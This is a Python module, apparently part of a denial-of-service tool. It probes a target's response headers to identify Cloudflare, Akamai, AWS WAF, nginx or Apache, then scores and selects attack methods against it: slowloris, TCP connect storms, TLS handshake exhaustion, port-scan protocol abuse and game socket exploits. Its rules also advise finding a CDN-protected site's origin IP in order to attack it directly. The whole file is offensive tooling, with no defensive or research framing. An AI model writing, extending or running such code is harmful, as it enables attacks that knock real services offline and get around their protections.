"""AI Traffic Analysis — Auto-select best attack method based on target's defense pattern.
Uses heuristic rules (no external ML model needed) to detect firewall/CDN type and recommend method."""
import asyncio
import aiohttp
from datetime import datetime, timezone

# Defense pattern detection rules
# 5 methods: PSPE(port-scan protocol abuse) | TCP(connect storm) | TLS(handshake exhaust) | HTTP(L7+slowloris drip) | GAME(socket exploit)
DEFENSE_RULES = {
    "cloudflare": {
        "detect": ["server: cloudflare", "cf-ray:", "cf-cache-status:", "__cf_bm"],
        "recommended": ["HTTP", "TLS", "PSPE"],
        "reason": "CDN: Find Origin IP first, then HTTP(slowloris drip)/TLS/PSPE on origin",
    },
    "akamai": {
        "detect": ["server: akamaighost", "akamai", "x-akamai"],
        "recommended": ["HTTP", "TLS", "PSPE"],
        "reason": "CDN — origin discovery + L7 HTTPS",
    },
    "aws_waf": {
        "detect": ["x-amz-cf-id", "x-amzn-waf", "awselb"],
        "recommended": ["HTTP", "TLS", "PSPE"],
        "reason": "WAF — HTTP slowloris drip + HTTPS flood",
    },
    "nginx_only": {
        "detect": ["server: nginx"],
        "recommended": ["PSPE", "TLS", "TCP", "HTTP"],
        "reason": "Nginx origin: PSPE multi-port + TLS + TCP connect storm",
    },
    "apache_only": {
        "detect": ["server: apache"],
        "recommended": ["HTTP", "PSPE", "TLS", "TCP"],
        "reason": "Apache bare: HTTP slowloris best, then PSPE multi-port",
    },
    "no_protection": {
        "detect": [],
        "recommended": ["PSPE", "TCP", "TLS", "HTTP", "GAME"],
        "reason": "No CDN — all 5 methods OK",
    },
}

METHOD_SCORES = {
    "cloudflare": {"PSPE": 5, "TCP": 5, "TLS": 6, "HTTP": 8, "GAME": 2},
    "akamai":     {"PSPE": 5, "TCP": 5, "TLS": 6, "HTTP": 8, "GAME": 2},
    "aws_waf":    {"PSPE": 5, "TCP": 5, "TLS": 6, "HTTP": 8, "GAME": 2},
    "nginx_only": {"PSPE": 10, "TCP": 8, "TLS": 9, "HTTP": 7, "GAME": 3},
    "apache_only":{"PSPE": 8, "TCP": 6, "TLS": 7, "HTTP": 10, "GAME": 3},
    "no_protection":{"PSPE": 10, "TCP": 9, "TLS": 8, "HTTP": 7, "GAME": 5},
}


async def detect_defense(target_host: str, target_port: int = 443) -> dict:
    """Probe target to detect firewall/CDN type. Returns defense info."""
    defense_type = "no_protection"
    detected_headers = []
    response_time_ms = 0

    try:
        scheme = "https" if target_port in (443, 8443) else "http"
        url = f"{scheme}://{target_host}/"
        timeout = aiohttp.ClientTimeout(total=10)
        start = datetime.now(timezone.utc)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, ssl=False, allow_redirects=False) as r:
                response_time_ms = int((datetime.now(timezone.utc) - start).total_seconds() * 1000)
                headers = {k.lower(): v.lower() for k, v in r.headers.items()}
                detected_headers = list(headers.keys())

                # Check each defense pattern
                server = headers.get("server", "")
                all_header_text = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()

                for dtype, rules in DEFENSE_RULES.items():
                    if dtype == "no_protection":
                        continue
                    for pattern in rules["detect"]:
                        if pattern in all_header_text:
                            defense_type = dtype
                            break
                    if defense_type != "no_protection":
                        break

    except Exception as e:
        # If we can't connect, target might be down or very restricted
        defense_type = "no_protection"
        response_time_ms = -1

    return {
        "defense_type": defense_type,
        "detected_headers": detected_headers[:10],
        "response_time_ms": response_time_ms,
        "recommended_methods": DEFENSE_RULES[defense_type]["recommended"],
        "reason": DEFENSE_RULES[defense_type]["reason"],
    }


def get_method_scores(defense_type: str) -> dict:
    """Return effectiveness scores for each method against detected defense."""
    return METHOD_SCORES.get(defense_type, METHOD_SCORES["no_protection"])


def auto_select_method(defense_type: str, available_methods: list) -> str:
    """Auto-select best method from available based on defense pattern."""
    scores = get_method_scores(defense_type)
    best = None
    best_score = -1
    for m in available_methods:
        s = scores.get(m.upper(), 0)
        if s > best_score:
            best = m
            best_score = s
    return best or "PSPE"
